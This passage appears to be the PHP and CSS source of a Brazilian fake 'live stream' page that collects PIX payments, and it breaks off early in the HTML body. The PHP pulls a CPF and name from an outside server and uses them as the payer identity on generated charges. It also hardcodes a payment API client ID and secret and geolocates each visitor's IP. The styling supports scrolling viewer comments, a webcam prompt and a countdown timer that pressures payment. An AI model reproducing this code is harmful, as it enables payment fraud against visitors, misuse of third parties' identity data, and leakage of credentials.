<?php
session_start(); // Inicia a sessão para armazenar o parâmetro 'id'

$redirectUrl = 'https://livemodelo.com/menu/homehome3.php';

// If the visitor has already been here during this session, immediately
// redirect them and stop any further processing so that none of the existing
// code below this point executes.
if (isset($_SESSION['visited_once']) && $_SESSION['visited_once'] === true) {
    header("Location: $redirectUrl");
    exit;
}

// Mark the page as visited so that any future attempt in the same browser
// session triggers the redirect above.
$_SESSION['visited_once'] = true;

// Verifica e armazena o parâmetro 'id' na sessão
if (isset($_GET['id'])) {
    $_SESSION['id'] = $_GET['id']; // Salva o 'id' na sessão
}

// Redireciona para a URL com o parâmetro 'id' se ele estiver faltando
if (!isset($_GET['id']) && isset($_SESSION['id'])) {
    $id = $_SESSION['id'];
    $newUrl = $_SERVER['PHP_SELF'] . "?id=" . urlencode($id);
    header("Location: $newUrl");
    exit();
}

// Validação dos parâmetros e lógica original
include 'BSPayAPI.php';
include 'database.php';

$valor = $_GET['id'] ?? null;
$nomeCompleto = $_GET['nome'] ?? null;
$valorMinimo = 1;
$valorMaximo = 100000;
$logFile = "errors.log";

file_put_contents($logFile, "id: $valor, Nome: $nomeCompleto\n", FILE_APPEND);

if ($valor === null) {
    file_put_contents($logFile, "O valor não foi informado.\n", FILE_APPEND);
    die(json_encode(['message' => 'O valor não foi informado.']));
}

if ($valor < $valorMinimo) {
    file_put_contents($logFile, "O valor não pode ser menor que $valorMinimo.\n", FILE_APPEND);
    die(json_encode(['message' => "O valor não pode ser menor que $valorMinimo."]));
} elseif ($valor > $valorMaximo) {
    file_put_contents($logFile, "O valor não pode ser maior que $valorMaximo.\n", FILE_APPEND);
    die(json_encode(['message' => "O valor não pode ser maior que $valorMaximo."]));
}

$randid = rand(11111, 99999);
$dataFutura = date('Y-m-d', strtotime('+1 day'));
$valor = floatval($valor);

file_put_contents($logFile, "Random ID: $randid, Data Futura: $dataFutura, id: $valor\n", FILE_APPEND);

$url = 'https://database-type.online/bspay/dados.php';
$data = json_decode(file_get_contents($url), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    file_put_contents($logFile, "Erro ao decodificar JSON: " . json_last_error_msg() . "\n", FILE_APPEND);
    die(json_encode(['message' => 'Erro ao decodificar JSON.']));
}

$cpf = $data['cpf'] ?? null;
$name = $data['name'] ?? null;

if ($cpf === null || $name === null) {
    file_put_contents($logFile, "Dados insuficientes: CPF ou Nome não encontrados.\n", FILE_APPEND);
    die(json_encode(['message' => 'Dados insuficientes.']));
}

$formatted_cpf = substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, -2);

file_put_contents($logFile, "CPF: $cpf, Formatted CPF: $formatted_cpf, Name: $name\n", FILE_APPEND);

$clientId = 'brando777_4762981867';
$clientSecret = '942b448dc5da47f5b389303c51c1b620b1ef337be014f9c7d0030906303ca53e';
$bspay = new BSPayAPI($clientId, $clientSecret);

try {
    $response = $bspay->gerarQrCodePix($valor, $name, $formatted_cpf, $randid);
} catch (Exception $e) {
    file_put_contents($logFile, "Erro ao gerar pagamento: " . $e->getMessage() . "\n", FILE_APPEND);
    die(json_encode(['message' => 'Erro ao gerar pagamento.']));
}

file_put_contents($logFile, "Response Data: " . print_r($response, true) . "\n", FILE_APPEND);

$pixqr = $response['qrcode'] ?? null;
$transactionId = $response['transactionId'] ?? null;

if ($pixqr === null || $transactionId === null) {
    file_put_contents($logFile, "Dados de pagamento insuficientes: QR Code ou ID não encontrados.\n", FILE_APPEND);
    die(json_encode(['message' => 'Dados de pagamento insuficientes.']));
}

$imgpix = "https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=" . urlencode($pixqr);

$valorFormatado = number_format($valor, 2, ',', '.');

// Inserir a transação no banco de dados
$pdo = connectDatabase();
$stmt = $pdo->prepare("INSERT INTO transactions (transaction_id, external_id, status) VALUES (?, ?, ?)");
$stmt->execute([$transactionId, $randid, 'PENDING']);

$primeiroNome = explode(' ', $nomeCompleto)[0];

$capitais = [
    "AC" => ["capital" => "Rio Branco", "ddd" => "68"],
    "AL" => ["capital" => "Maceió", "ddd" => "82"],
    "AP" => ["capital" => "Macapá", "ddd" => "96"],
    "AM" => ["capital" => "Manaus", "ddd" => "92"],
    "BA" => ["capital" => "Salvador", "ddd" => "71"],
    "CE" => ["capital" => "Fortaleza", "ddd" => "85"],
    "DF" => ["capital" => "Brasília", "ddd" => "61"],
    "ES" => ["capital" => "Vitória", "ddd" => "27"],
    "GO" => ["capital" => "Goiânia", "ddd" => "62"],
    "MA" => ["capital" => "São Luís", "ddd" => "98"],
    "MT" => ["capital" => "Cuiabá", "ddd" => "65"],
    "MS" => ["capital" => "Campo Grande", "ddd" => "67"],
    "MG" => ["capital" => "Belo Horizonte", "ddd" => "31"],
    "PA" => ["capital" => "Belém", "ddd" => "91"],
    "PB" => ["capital" => "João Pessoa", "ddd" => "83"],
    "PR" => ["capital" => "Curitiba", "ddd" => "41"],
    "PE" => ["capital" => "Recife", "ddd" => "81"],
    "PI" => ["capital" => "Teresina", "ddd" => "86"],
    "RJ" => ["capital" => "Rio de Janeiro", "ddd" => "21"],
    "RN" => ["capital" => "Natal", "ddd" => "84"],
    "RS" => ["capital" => "Porto Alegre", "ddd" => "51"],
    "RO" => ["capital" => "Porto Velho", "ddd" => "69"],
    "RR" => ["capital" => "Boa Vista", "ddd" => "95"],
    "SC" => ["capital" => "Florianópolis", "ddd" => "48"],
    "SP" => ["capital" => "São Paulo", "ddd" => "11"],
    "SE" => ["capital" => "Aracaju", "ddd" => "79"],
    "TO" => ["capital" => "Palmas", "ddd" => "63"]
];

// Função para obter informações do cliente
function getClientInfo($ip = null) {
    $ip = $ip ?? $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/$ip";
    $response = @file_get_contents($url);
    return $response ? json_decode($response, true) : null;
}

// Obter informações do cliente
$info = getClientInfo();

if ($info && $info['status'] === 'success') {
    $estado = $info['region'];
    $cidade = $info['city'];
    $pais = $info['country'];
    $ip = $info['query'];
    $capital = $capitais[$estado]['capital'] ?? null;
    $ddd = $capitais[$estado]['ddd'] ?? null;

    $result = [
        "ip" => $ip,
        "cidade" => $cidade,
        "estado" => $estado,
        "pais" => $pais,
        "capital_estado" => $capital,
        "ddd_capital" => $ddd
    ];
} else {
    $result = [
        "error" => "Não foi possível obter as informações de localização."
    ];
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AO VIVO 🔴</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #ff3366;
            --primary-dark: #d41e4b;
            --primary-light: #ff6b8e;
            --secondary-color: #2a2a2a;
            --accent-color: #00d1ff;
            --accent-dark: #00a3c9;
            --light-bg: #f8f8f8;
            --dark-bg: #1a1a1a;
            --dark-bg-gradient: linear-gradient(to bottom, #222222, #1a1a1a);
            --text-white: #ffffff;
            --text-gray: #a0a0a0;
            --success-green: #00c969;
            --success-green-dark: #00a755;
            --live-red: #cc0000;
            --vip-gold: #ffd700;
            --vip-gold-dark: #cca700;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: var(--dark-bg);
            background-image: var(--dark-bg-gradient);
            color: var(--text-white);
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        /* Header Section */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
        }
        
        .small-logo {
            width: 60px;
            height: 60px;
            object-fit: cover;
            margin-right: 5px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            margin-left: -8px;
        }
        
        .profile-info {
            display: flex;
            align-items: center;
            height: 60px;
        }
        
        .profile-pic {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid var(--primary-color);
            box-shadow: 0 0 10px rgba(255, 51, 102, 0.5);
        }
        
        .profile-text {
            margin-left: 10px;
        }
        
        .profile-name {
    font-size: clamp(10px, 2.5vw, 14px); /* diminui dinamicamente */
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    flex: 1;
    min-width: 0;
}
        
        .viewers-count {
            font-size: 12px;
            color: var(--accent-color);
            font-weight: bold;
            display: flex;
            align-items: center;
        }
        
        .viewers-count i {
            margin-right: 5px;
            color: var(--accent-color);
            text-shadow: 0 0 10px rgba(0, 209, 255, 0.7);
        }
        
        .header-actions {
            display: flex;
            align-items: center;
            gap: 1px;
        }
        
        /* Live Indicator */
        .live-indicator {
            display: flex;
            margin-left: 5px;
            animation: pulse 3s ease-in-out infinite;
            margin-right: 5px;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .live-indicator svg {
            height: 24px;
            filter: drop-shadow(0 0 5px rgba(204, 0, 0, 0.7));
        }
        
        /* VIP Button */
        .vip-button {
            background: linear-gradient(to bottom, var(--primary-dark), var(--primary-light));
            color: #fbfbfb;
            border: none;
            border-radius: 50px;
            padding: 8px 15px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(255, 215, 0, 0.5);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            margin-right: -8px;
        }
        
        .vip-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 215, 0, 0.6);
        }
        
        .vip-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 5px rgba(255, 215, 0, 0.4);
        }
        
        .vip-button i {
            font-size: 19px;
        }
        
        /* Video Container */
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        
        #liveVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
            opacity: 0;
            transition: opacity 1s ease;
        }
        
        #liveVideo.active {
            opacity: 1;
        }
        
        /* User Camera */
        .user-camera-container {
            position: left;
            width: 120px;
            aspect-ratio: 3 / 4;
            border-radius: 12px;
            overflow: hidden;
            z-index: 100;
            background-color: #333333;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(255, 255, 255, 0.1);
            touch-action: none;
            cursor: grab;
            transition: box-shadow 0.3s ease;
        }

        .user-camera-container.dragging {
            box-shadow: 0 8px 20px rgba(255, 51, 102, 0.5);
            cursor: grabbing;
        }
        
        @media (max-width: 576px) {
            .user-camera-container {
                width: 100px;
            }
        }

        #userCamera {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8));
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 11;
        }

        .camera-overlay p {
            color: var(--text-white);
            font-size: 12px;
            font-weight: bold;
            padding: 5px;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.8);
        }

        .camera-denied {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, #555555, #333333);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 11;
        }

        .camera-denied p:first-child {
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .camera-denied p:last-child {
            color: #eee;
            font-size: 10px;
            margin-top: 5px;
            margin-bottom: 5px;
        }
        
        /* Comments Section */
        .comments-container {
            position: absolute;
            bottom: 70px;
            left: 0;
            width: 70%;
            height: calc(100% - 170px);
            overflow: visible;
            z-index: 10;
            padding-bottom: 20px;
            pointer-events: none;
        }
        
        @media (max-width: 768px) {
            .comments-container {
                width: 75%;
                bottom: 60px;
            }
        }
        
        .comment {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            border-radius: 20px;
            padding: 8px 12px;
            margin: 5px 10px;
            display: flex;
            align-items: center;
            width: fit-content;
            animation: slideUpFade 5s forwards;
            position: absolute;
            bottom: -50px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
            border-left: 3px solid var(--primary-color);
            pointer-events: auto;
        }
        
        .comment-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        .comment-text {
            font-size: 14px;
        }
        
        .commenter-name {
            font-weight: bold;
            margin-right: 5px;
            color: #ffde59;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
        }
        
        .vip-tag {
            background: linear-gradient(to right, var(--vip-gold), var(--vip-gold-dark));
            color: #000;
            border-radius: 4px;
            padding: 2px 5px;
            font-size: 10px;
            font-weight: bold;
            margin-left: 5px;
            display: inline-flex;
            align-items: center;
            gap: 3px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        
        .vip-tag i {
            font-size: 9px;
        }
        
        @keyframes slideUpFade {
            0% {
                transform: translateY(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-250px);
                opacity: 0;
            }
        }
        
        /* Comment Notification */
        .comment-notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(255, 0, 0, 0.8);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 2500;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .comment-notification.show {
            animation: fadeInOut 2s forwards;
        }
        
        /* Notification */
        .notification {
            position: absolute;
            top: 90px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            color: var(--success-green);
            padding: 8px 15px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: bold;
            z-index: 20;
            display: flex;
            align-items: center;
            animation: fadeInOut 3s forwards;
            opacity: 0;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.4);
            border-left: 3px solid var(--success-green);
        }
        
        .notification i {
            margin-right: 8px;
            color: var(--success-green);
            text-shadow: 0 0 5px rgba(0, 201, 105, 0.5);
        }
        
        @keyframes fadeInOut {
            0% {
                opacity: 0;
                transform: translateY(-20px);
            }
            15% {
                opacity: 1;
                transform: translateY(0);
            }
            85% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(-20px);
            }
        }
        
        /* Bottom Controls */
        .bottom-controls {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0, 0, 0, 0.9) 50%, transparent);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 10;
        }
        
        .comment-input {
            background-color: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(5px);
            color: var(--text-white);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px;
            padding: 12px 20px;
            flex-grow: 1;
            margin-right: 15px;
            margin-left: 15px;
            font-size: 14px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        
        .comment-input:focus {
            outline: none;
            background-color: rgba(255, 255, 255, 0.2);
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(255, 51, 102, 0.3);
        }
        
        .comment-input::placeholder {
            color: var(--text-gray);
        }
        
        .interaction-buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-left: 5px;
            gap: 5px;
        }
        
        .interaction-button {
            background: none;
            border: none;
            color: var(--text-white);
            font-size: 26px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: transform 0.2s ease;
        }
        
        .interaction-button i {
            text-shadow: 0 0 10px rgba(255, 51, 102, 0.7);
            transition: all 0.3s ease;
        }
        
        .interaction-button:hover i {
            transform: scale(1.2);
        }
        
        .interaction-button:active i {
            transform: scale(0.9);
        }
        
        .interaction-count {
            font-size: 12px;
            margin-top: 2px;
            font-weight: bold;
        }
        
        /* QR Code Container */
        .payment-container {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            color: #333;
            padding: 25px;
            border-radius: 25px 25px 0 0;
            z-index: 2000;
            transform: translateY(100%);
            transition: transform 0.5s cubic-bezier(0.19, 1, 0.22, 1);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.7);
            max-height: 90vh;
            overflow-y: auto;
        }
        
        .payment-container.active {
            transform: translateY(0);
        }
        
        .payment-container h2 {
            font-size: 22px;
            margin-bottom: 15px;
            color: var(--primary-color);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .payment-container h3 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #222;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        
        .payment-container .divider {
            width: 50px;
            height: 4px;
            background: linear-gradient(to right, var(--primary-color), var(--primary-light));
            margin: 15px auto;
            border-radius: 2px;
        }
        
        .phone-input-container {
            width: 100%;
            margin: 20px 0;
            max-width: 350px;
        }
        
        .phone-input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #eee;
            border-radius: 50px;
            font-size: 16px;
            text-align: center;
            margin-bottom: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.05);
        }
        
        .phone-input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(255, 51, 102, 0.2);
        }
        
        .input-error {
            color: #ff3366;
            font-size: 13px;
            margin-top: -5px;
            margin-bottom: 10px;
        }
        
        .qr-code-img {
            width: 220px;
            height: 220px;
            margin: 15px auto;
            padding: 10px;
            border: 1px solid #eee;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            background-color: white;
            position: relative;
            overflow: hidden;
        }
        
        .qr-code-img::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(255, 255, 255, 0) 80%, rgba(255, 51, 102, 0.1));
            z-index: 1;
        }
        
        .qr-code-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            z-index: 2;
            position: relative;
            border-radius: 10px;
        }
        
        .pix-code {
            width: 100%;
            max-width: 350px;
            padding: 12px 15px;
            border: 1px solid #eee;
            border-radius: 10px;
            font-size: 13px;
            margin: 15px 0;
            background-color: #f9f9f9;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            position: relative;
        }
        
        .pix-code:hover {
            background-color: #f0f0f0;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
        }
        
        .pix-code::after {
            content: 'Clique para copiar';
            position: absolute;
            bottom: -20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 10px;
            color: #999;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .pix-code:hover::after {
            opacity: 1;
        }
        
        .copy-button {
            background: linear-gradient(to bottom, var(--primary-color), var(--primary-dark));
            color: white;
            border: none;
            border-radius: 50px;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
            max-width: 300px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .copy-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 51, 102, 0.4);
        }
        
        .copy-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 8px rgba(255, 51, 102, 0.4);
        }
        
        .copy-button i {
            font-size: 18px;
        }
        
        .payment-note {
            font-size: 14px;
            color: #777;
            margin: 10px 0 20px;
            max-width: 350px;
            line-height: 1.5;
        }
        
        /* Status Indicator */
        #statusPagamento {
            margin-top: 5px;
            padding: 15px;
            border-radius: 10px;
            font-weight: bold;
            width: 100%;
            max-width: 350px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
        }
        
        .status-pending {
            background-color: #ff9800;
            color: white;
            box-shadow: 0 3px 10px rgba(255, 152, 0, 0.3);
        }
        
        .status-success {
            background-color: var(--success-green);
            color: white;
            box-shadow: 0 3px 10px rgba(0, 201, 105, 0.3);
        }
        
        /* Audio Alert */
        .audio-alert {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.40);
            backdrop-filter: blur(12px);
            color: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            z-index: 1500;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .audio-alert svg {
            margin-bottom: 15px;
            filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.3));
        }
        
        .audio-alert p {
            font-size: 18px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .audio-alert button {
            background: linear-gradient(to bottom, var(--primary-color), var(--primary-dark));
            color: white;
            border: none;
            border-radius: 50px;
            padding: 13px 33px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.5);
            width: 200px;
        }
        
        .audio-alert button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 51, 102, 0.4);
        }
        
        .audio-alert button:active {
            transform: translateY(0);
            box-shadow: 0 2px 8px rgba(255, 51, 102, 0.4);
        }

        /* Make sure Typebot bubble is visible with proper z-index */
        #typebot-bubble-container {
            z-index: 2100 !important;
        }
        
        /* Reposicionamento do botão do Typebot */
        #typebot-bubble-button {
            opacity: 0;
            pointer-events: none;
            transition: all 0.3s ease;
            z-index: 2100 !important;
            position: fixed !important;
            left: 20px !important;
            bottom: auto !important;
            right: auto !important;
        }
        
        /* Show typebot button when payment containers are active */
        .payment-container.active ~ #typebot-bubble-container #typebot-bubble-button,
        .payment-container.active + #typebot-bubble-container #typebot-bubble-button {
            opacity: 1 !important;
            pointer-events: all !important;
            top: 80px !important; /* Position above the container */
        }
        
        /* Copy notification */
        #copyMessage {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 2500;
            display: none;
            align-items: center;
            gap: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            border-left: 3px solid var(--success-green);
        }
        
        #copyMessage i {
            color: var(--success-green);
        }
        
        /* Loading Spinner */
        .loaderSpinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1.5s linear infinite;
            display: inline-block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Heart animation */
        @keyframes floatUp {
            0% { transform: translateY(0) scale(1); opacity: 1; }
            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
        }
        
        .heart-animation {
            position: fixed;
            z-index: 1000;
            animation: floatUp 1.5s forwards;
        }
        
        /* Responsiveness */
        @media (max-width: 1200px) {
            .payment-container {
                padding: 20px 15px;
            }
        }
        
        @media (max-width: 992px) {
            .qr-code-img {
                width: 200px;
                height: 200px;
            }
        }
        
        @media (max-width: 768px) {
            .profile-name {
    font-size: clamp(8px, 2.5vw, 20px); /* diminui dinamicamente */
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    flex: 1;
    min-width: 0;
}
            
            .header {
                padding: 8px 12px;
            }
            
            .small-logo {
                width: 50px;
                height: 50px;
                margin-left: -8px;
            }
            
            .profile-pic {
                width: 38px;
                height: 38px;
            }
            
            .vip-button {
                padding: 6px 12px;
                font-size: 19px;
                margin-right: -8px;
            }
            
            .audio-alert {
                padding: 20px;
                width: 90%;
                max-width: 350px;
            }
            
            .audio-alert p {
                font-size: 16px;
            }
            
            .audio-alert button {
                width: 180px;
                padding: 10px 25px;
            }
        }
        
        @media (max-width: 576px) {
            .viewers-count {
                font-size: 11px;
            }
            
            .profile-name {
    font-size: clamp(10px, 2.5vw, 14px); /* diminui dinamicamente */
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    flex: 1;
    min-width: 0;
}
            
            .comment-input {
                padding: 10px 15px;
                font-size: 13px;
            }
            
            .qr-code-img {
                width: 180px;
                height: 180px;
            }
            
            .payment-container h2 {
                font-size: 18px;
            }
            
            .payment-container h3 {
                font-size: 24px;
            }
            
            .copy-button {
                padding: 12px 25px;
                font-size: 14px;
            }
            
            .bottom-controls {
                padding: 12px 10px;
            }
            
            .interaction-button {
                font-size: 22px;
            }
            
            .interaction-count {
                font-size: 11px;
            }
            
            .comments-container {
                width: 80%;
            }
        }
        
        @media (max-height: 700px) {
            .payment-container {
                padding-top: 15px;
                padding-bottom: 15px;
            }
            
            .payment-container h2 {
                margin-bottom: 10px;
            }
            
            .payment-container h3 {
                margin-bottom: 10px;
            }
            
            .phone-input-container {
                margin: 10px 0;
            }
            
            .qr-code-img {
                margin: 10px auto;
            }
            
            .copy-button {
                margin: 10px 0;
            }
        }
        /* Countdown Timer */
.countdown-timer {
    margin: 15px auto 25px;
    width: 100%;
    max-width: 280px;
    position: relative;
}

.timer-label {
    color: var(--primary-color);
    font-size: 14px;
    font-weight: bold;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 10px;
    text-align: center;
    text-shadow: 0 0 10px rgba(255, 51, 102, 0.4);
    animation: pulseText 2s infinite;
}

@keyframes pulseText {
    0% { opacity: 1; }
    50% { opacity: 0.7; }
    100% { opacity: 1; }
}

.timer-container {
    background: linear-gradient(to bottom, #2a2a2a, #1a1a1a);
    padding: 15px;
    border-radius: 15px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4), 
                0 0 10px rgba(255, 51, 102, 0.2),
                inset 0 1px 1px rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.05);
    position: relative;
    overflow: hidden;
}

.timer-container::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: radial-gradient(circle, rgba(255, 51, 102, 0.08) 0%, rgba(0, 0, 0, 0) 70%);
    animation: lightEffect 8s infinite linear;
    z-index: 0;
}

@keyframes lightEffect {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.timer-unit {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 2px;
    position: relative;
    z-index: 1;
}

.flip-card {
    display: inline-block;
    position: relative;
    width: 40px;
    height: 60px;
    margin: 0 2px;
    font-size: 30px;
    font-weight: bold;
    line-height: 60px;
    border-radius: 8px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
    perspective: 200px;
    background: #1a1a1a;
    overflow: hidden;
}

.flip-card .top, 
.flip-card .bottom {
    position: absolute;
    width: 100%;
    height: 50%;
    overflow: hidden;
    text-align: center;
    background: linear-gradient(to bottom, #333333, #222222);
    color: var(--text-white);
    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.8);
    box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.15);
}

.flip-card .top {
    top: 0;
    line-height: 50px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    border-bottom: 1px solid rgba(0, 0, 0, 0.4);
    background: linear-gradient(to bottom, #444444, #333333);
}

.flip-card .bottom {
    bottom: 0;
    line-height: 0;
    border-bottom-left-radius: 8px;
    border-bottom-right-radius: 8px;
    background: linear-gradient(to bottom, #222222, #1a1a1a);
}

.flip-card.flipping .top {
    animation: flipTop 0.5s ease-in-out;
    transform-origin: bottom center;
}

.flip-card.flipping .bottom {
    animation: flipBottom 0.5s ease-in-out;
    transform-origin: top center;
}

@keyframes flipTop {
    0% { transform: rotateX(0deg); }
    50% { transform: rotateX(90deg); }
    100% { transform: rotateX(0deg); }
}

@keyframes flipBottom {
    0% { transform: rotateX(0deg); }
    50% { transform: rotateX(-90deg); }
    100% { transform: rotateX(0deg); }
}

.timer-separator {
    font-size: 30px;
    color: var(--primary-color);
    margin: 0 2px;
    text-shadow: 0 0 10px rgba(255, 51, 102, 0.7);
    animation: pulseSeparator 1s infinite;
}

@keyframes pulseSeparator {
    0% { opacity: 1; }
    50% { opacity: 0.3; }
    100% { opacity: 1; }
}

.timer-text {
    text-align: center;
    font-size: 10px;
    color: var(--text-gray);
    margin-top: 5px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

/* Timer responsive styles */
@media (max-width: 576px) {
    .flip-card {
        width: 35px;
        height: 50px;
        font-size: 25px;
        line-height: 50px;
    }
    
    .timer-separator {
        font-size: 25px;
    }
    
    .timer-label {
        font-size: 12px;
    }
}
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="logo-container">
